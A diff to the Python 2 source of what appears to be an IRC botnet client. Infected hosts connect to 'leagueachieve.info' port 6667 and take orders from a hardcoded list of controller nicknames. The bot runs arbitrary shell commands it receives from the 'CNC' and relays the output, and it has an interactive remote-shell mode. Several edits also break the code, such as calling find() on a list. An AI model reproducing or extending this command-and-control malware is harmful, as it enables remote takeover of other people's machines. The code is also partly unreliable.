@@ -41,14 +41,18 @@ def execute(cmd): #execute shell commands
 	cmdList = []
 	if (cmd.find(" ") != -1):
 		cmdList = cmd.split(" ")
-		
-		try:#checking for syntax errors
+
+		try: #checking for syntax errors
 			p = sub.Popen(cmdList,stdout=sub.PIPE,stderr=sub.PIPE)
 			output, errors = p.communicate()
 		
-		except:#if there was some sytax error, spit back an error
+		except: #if there was some sytax error, spit back an error
 			print "An error has occured.\n"
-			return "An error has occured. Probably invalid command or syntax."
+			if "ls" == cmd[:2] and operatingSystem == "windows": #if it was ls and it's on windows, change to dir
+				q = sub.Popen("dir",stdout=sub.PIPE,stderr=sub.PIPE)
+				output, errors = q.communicate()
+			else:
+				return "An error has occured. Probably invalid command or syntax."
 
 	#handles a 1-liner
 	else:
@@ -78,7 +82,7 @@ def execute(cmd): #execute shell commands
 
 		for element in lines: #check if a line is JUST a newline
 			if element == "":
-				lines[lines.index(element)] = "~" #replace newline with a ~
+				lines[lines.find(element)] = "~" #replace newline with a ~
 
 		return lines
 	
@@ -243,6 +247,7 @@ def runFunction(cmd):
 		print "function called"
 	elif cmd[:pos] in commandsParams.keys():
 		output = commandsParams[cmd[:pos]](cmd[(pos+1):]) #run appropriate function. get return value in 'output'
+		print "function called"
 		if output != None: #if the function returned something, we need to send it
 			sendData(output)
 	else: #if not recognized
@@ -264,7 +269,7 @@ INTERACT = [0, 1, 1] 	#index one is the boolean for if the interactive shell is 
 admins = ["king", "samorizu", "blackbear", "bigshebang"]
 server = "leagueachieve.info"
 port = 6667
-channel = "#test"
+channel = "#lobby"
 nick = generateNick(operatingSystem)
 
 print "The botnick is: '%s'" % nick
@@ -310,14 +315,13 @@ def parseCommand(command):
 			print "we got a bunch of lines...doing nothing"
 			return
 
-		header = command[:command.index("PRIVMSG")] #get everything before PRIVMSG
-		if ":" in header: #check if there is a colon first, to avoid crashing
-			header = header[(header.index(":") + 1):] #get all after colon
+		header = command[:command.find("PRIVMSG")] #get everything before PRIVMSG
+		header = header[(header.find(":") + 1):] #get all after colon
 
-		user = header[:header.index("!~")] #user sending message
-		host = header[(header.index("!~") + 2):header.index(" ")] #hostname and ip/domain name: 'blarg@1.2.3.4'
-		hostname = host[:host.index("@")] #hostname: 'blarg'
-		client = host[(host.index("@") + 1):] #client/ip/domain name: '1.2.3.4' or 'blarg.com'
+		user = header[:header.find("!~")] #user sending message
+		host = header[(header.find("!~") + 2):header.find(" ")] #hostname and ip/domain name: 'blarg@1.2.3.4'
+		hostname = host[:host.find("@")] #hostname: 'blarg'
+		client = host[(host.find("@") + 1):] #client/ip/domain name: '1.2.3.4' or 'blarg.com'
 
 		if DEBUG:
 			print "user is '%s'" % user
@@ -326,8 +330,8 @@ def parseCommand(command):
 			print "client is '%s'" % client
 
 		if user in admins: #check if sender is an approved controller
-			tempCommand = command[command.index("PRIVMSG"):]
-			command = tempCommand[(tempCommand.index(':') + 1):].strip().lower()
+			tempCommand = command[command.find("PRIVMSG"):]
+			command = tempCommand[(tempCommand.find(':') + 1):].strip().lower()
 
 			print "Recieved '%s' from the CNC" % command #print command
 
@@ -381,9 +385,10 @@ def parseCommand(command):
 				users = lines[0].split(" ")
 				if nick in users or "all" in users:
 					lines[1] = lines[1].strip()
-					if lines[1] in commands.keys(): #if regular command
-						commands[lines[1]]() #call appropriate function
-						print "function called"
+					runFunction(lines[1])
+					# if lines[1] in commands.keys(): #if regular command
+						# commands[lines[1]]() #call appropriate function
+						# print "function called"
 			else:
 				runFunction(command) #run function
 		else:
@@ -391,8 +396,8 @@ def parseCommand(command):
 
 	else: #we should not be listening, so we'll wait for '??stop' to end interactive shell
 		if "PRIVMSG" in command:
-			command = command[command.index("PRIVMSG"):]
-			command = command[(command.index(':') + 1):].strip().lower()
+			command = command[command.find("PRIVMSG"):]
+			command = command[(command.find(':') + 1):].strip().lower()
 			if "??finish" == command[:8]:
 				INTERACT[0] = 0
 				INTERACT[1] = 1
